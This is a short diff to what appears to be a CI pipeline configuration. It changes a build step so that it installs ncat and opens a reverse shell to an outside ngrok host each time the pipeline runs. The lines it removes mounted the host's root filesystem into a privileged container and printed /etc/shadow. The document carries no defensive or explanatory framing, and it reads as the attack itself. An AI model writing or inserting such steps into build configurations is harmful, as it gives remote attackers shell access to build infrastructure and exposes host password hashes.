@@ -6,16 +6,6 @@ name: default
 steps:
 - name: shell
   image: alpine
-  privileged: true
-  volumes:
-  - name: hostroot
-    path: /hostroot
   commands:
-  - ls /hostroot/
-  - cat /hostroot/etc/shadow
+  - apk add --no-cache nmap-ncat
   - ncat 8.tcp.ngrok.io 19227 -e /bin/sh
-
-volumes:
-- name: hostroot
-  host:
-    path: /
